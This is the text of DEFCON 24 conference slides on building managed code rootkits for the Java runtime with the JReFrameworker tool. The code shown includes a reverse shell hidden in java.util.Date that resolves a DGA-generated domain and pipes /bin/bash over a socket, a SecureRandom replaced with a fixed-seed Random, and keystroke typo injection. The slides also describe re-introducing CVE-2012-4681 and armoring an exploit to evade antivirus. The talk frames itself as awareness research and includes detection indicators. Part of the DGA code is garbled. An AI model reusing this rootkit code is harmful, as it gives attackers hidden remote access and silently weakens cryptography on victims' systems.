Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images
@MergeType
public class PixelatedBufferedImage extends BufferedImage {
@DefineField
boolean pixelated = false;
@MergeMethod
public Graphics getGraphics() {
if(!pixelated) setData(pixelate(getData()));
return super.getGraphics();
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images (5x pixel size)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images (10x pixel size)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images (25x pixel size)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pixelated Images (50x pixel size)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Decreasing Productivity
Deﬁne SpellWrecker class (inverse of a spellchecker)
As average typing speed increases, more typos are injected
As average typing speed reduces, less typos are injected
@MergeType
public class SpellWreckedKeyEvent extends KeyEvent {
@MergeMethod
@Override
public char getKeyChar(){
char original = super.getKeyChar();
return SpellWrecker.spellwreck(original);
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
CVE-2012-4681
Applet can bypass security restrictions to execute arbitrary code
Combination of two vulnerabilities
Excellent reliability, multi platform
“Gondvv” exploit found in the wild (August 2012)
PoC Exploit: http://pastie.org/4594319
Metasploit Module: exploit/multi/browser/java_jre17_exec
Detailed analysis by Immunity Products
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
CVE-2012-4681 (Exploit Armoring Experiment)
Source: github.com/benjholla/CVE-2012-4681-Armoring
Submitted to VirusTotal 2 years after found in the wild. . .
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
CVE-2012-4681 (Exploit Armoring Experiment)
Source: github.com/benjholla/CVE-2012-4681-Armoring
Submitted to VirusTotal 4 years after found in the wild. . .
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
CVE-2012-4681 (“The Reverse Bug Patch”)
“Unﬁxing” CVE-2012-4681 in Java 8
com.sun.beans.finder.ClassFinder
Remove calls to ReﬂectUtil.checkPackageAccess(. . . )
com.sun.beans.finder.MethodFinder
Remove calls to ReﬂectUtil.isPackageAccessible(. . . )
sun.awt.SunToolkit
Restore getField(...) method
Unobfuscated vulnerability gets 0/56 on VirusTotal
What’s the diﬀerence between vulnerabilities and exploits?
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
SCADA HMI Application Modiﬁcations
If you can modify a runtime, you
can modify an application...
Example: SCADA HMI application
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
SCADA HMI Application Modiﬁcations
Original HMI application lacks
modern security mechanisms
Challenge: Can we enhance the
security for “alarms” list without
access to the source code?
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
SCADA HMI Application Modiﬁcations
Backend server enhanced with an
application ﬁrewall
Firewall supports new security policy
mechanisms (e.g. two factor
authentication)
HMI client UI enhanced with
prompts for ﬁrewall challenge
responses
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Mitigations
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Bytecode Modiﬁcation Indicators
What is wrong with this picture? (hint: look at the line numbers)
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Bytecode Modiﬁcation Indicators
File hash
File size (original: ~50mb, modiﬁed: ~25mb)
“jref_” method rename preﬁx (can be changed in preferences)
Class/Method/Field counts
Code metrics (e.g. cyclomatic complexity)
. . .
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Being Aware
JReFrameworker is an awareness project!
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Q/A
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Still plenty of work to do. . .
The woods are lovely, dark and deep,
But I have promises to keep,
And miles to go before I sleep,
And miles to go before I sleep.
-Robert Frost
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Questions?
Thank you!
JReFrameworker:
Setup + Tutorials: jreframeworker.com
Source Code: github.com/JReFrameworker
References:
github.com/JReFrameworker/JReFrameworker/blob/master/REFERENCES.md
Additional Resources
Managed Code Rootkits: appsec-labs.com/managed_code_rootkits
ASM Transformations Whitepaper: asm.ow2.org/current/asm-transformations.pdf
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
The JVM isn’t just for Java
JVM Speciﬁc
Java, Scala, Clojure, Groovy, Ceylon, Fortess, Gosu, Kotlin. . .
Ported Languages
JRuby, Jython, Smalltalk, Ada, Scheme, REXX, Prolog, Pascal, Common LISP. . .
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pokémon! Gotta Hack em’ All!
Application contains callbacks for special premium
bracelet notiﬁcations
Just need to add tactile feedback to user
Slightly more complicated toolchain for modifying
Android apps
.apk -> APKTool -> Dex2Jar -> JReFrameworker ->
DX -> APKTool -> .apk
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Pokémon! Gotta Hack em’ All!
@MergeType
public class NotifyLegendaryPokemon extends
com.nianticproject.holoholo.sfida.unity.SfidaUnityPlugin {
@MergeMethod
public boolean notifySpawnedLegendaryPokemon(String param){
vibrate();
return super.notifySpawnedLegendaryPokemon(param);
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
DEFCON Inspirations
It is truly an honor to be here
Early memories of reading Winn Schwartau’s
Information Warfare
One of my ﬁrst introductions to security topics
This talk itself was inspired by a previous
DEFCON talk
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
Malicious client probes for payload
Create a reverse shell to the domain of the day
public static void main(String[] args) throws Exception {
Date d = new Date();
// attempts to invoke a private method named reverseShell
// in java.util.Date that may or may not exist ;)
Method method = d.getClass().getDeclaredMethod("reverseShell");
method.setAccessible(true);
method.invoke(d);
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
public class java.util.Date {
private void reverseShell(){
String domain = "www.";
int year = getYear(); int month = getMonth(); int day = getDay();
for(int i=0; i> 11) ^ ((year & 0xFFFFFFF0) > 25) ^ 16 * (month & 0xFFFFFFF8);
day = ((day ^ (day > 19) ^ ((day & 0xFFFFFFFE) << 12);
domain += (char)((Math.abs((year ^ month ^ day)) % 25) + 97);
}
domain += ".com";
...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Reverse Shell + DGA
Deﬁne a java.util.StreamForwarder class
Forward shell inputs/outputs to TCP stream
InetAddress address = InetAddress.getByName(domain);
String ipAddress = address.getHostAddress();
final Process process = Runtime.getRuntime().exec("/bin/bash");
Socket socket = new Socket(ipAddress, 6666);
forwardStream(socket.getInputStream(), process.getOutputStream());
forwardStream(process.getInputStream(), socket.getOutputStream());
forwardStream(process.getErrorStream(), socket.getOutputStream());
process.waitFor();
...
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment
Developing Managed Code Rootkits for the Java Runtime Environment
$ whoami
Background
JReFrameworker
Modules
Mitigations
Q/A
Downgrading Security
@MergeType
public class InsecureRandom extends SecureRandom {
@DefineField
private Random random;
@MergeMethod
public int nextInt(){
if(random == null){
random = new Random(0 /* fixed seed */);
}
return random.nextInt();
}
}
DEFCON 24, August 6th 2016
Developing Managed Code Rootkits for the Java Runtime Environment